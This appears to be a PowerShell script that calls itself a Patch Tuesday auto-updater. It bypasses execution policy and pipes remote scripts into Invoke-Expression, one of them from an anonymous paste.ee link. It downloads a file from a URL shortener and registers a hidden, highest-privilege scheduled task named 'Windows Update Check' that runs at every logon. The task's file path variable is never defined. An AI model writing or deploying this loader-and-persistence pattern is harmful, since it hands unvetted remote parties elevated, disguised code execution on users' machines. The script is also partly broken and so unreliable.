# Prepare system
    Set-executionpolicy -ExecutionPolicy Bypass -Scope Process -Force
    $scripts = "https://raw.githubusercontent.com/tsrob50/Get-PatchTuesday/master/Get-PatchTuesday.ps1","https://paste.ee/r/7Kauc"
    $scripts | %{ iwr -useb $_ | iex}

# IF patchtuesday was yesterday, update system
    if ((get-date) -eq (Get-PatchTuesday).AddDays(1)){

        # Update Notification MSG
        if(!(test-path "C:\Program Files\PackageManagement\ProviderAssemblies\nuget\2.8.5.208")){Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force}
        if(!(Get-module -name BurntToast)){Install-Module -Name BurntToast -Force}
        $Logolink = "https://tinyurl.com/asdsad11111"
        $Logo = "$($env:TMP)\Coffee.gif"
        (New-Object net.webclient).Downloadfile($logolink, $logo )
        New-BurntToastNotification -Applogo $logo -Text "PatchTuesday was yesterday!", "Patching system now.."
    
        # Installing updates
        Install-Module PSWindowsUpdate -Force
        Import-module PSWindowsUpdate
        Install-WindowsUpdate -Confirm:$False
                
        # Telling its done
        (New-Object net.webclient).Downloadfile($logolink, $logo )
        New-BurntToastNotification -Applogo $logo -Text "PatchTuesday installed", "System is updated."}

# Set Schedule for next update
    $Action   = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ep bypass -w hidden -file $appupdatepath"
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable
    $Date   = New-ScheduledTaskTrigger -Once -At (Get-NextPatchtuesday).AddDays(1) 
    $AtLogon  = New-ScheduledTaskTrigger -AtLogOn
    $AtLogon.Delay = 'PT5M'
    $User     = If ($Args[0]) {$Args[0]} Else {[Environment]::UserName}

    Register-ScheduledTask -TaskName "Windows Update Check ($User)" -Action $Action -Settings $Settings -Trigger $Date,$AtLogon -User $User -RunLevel Highest –Force
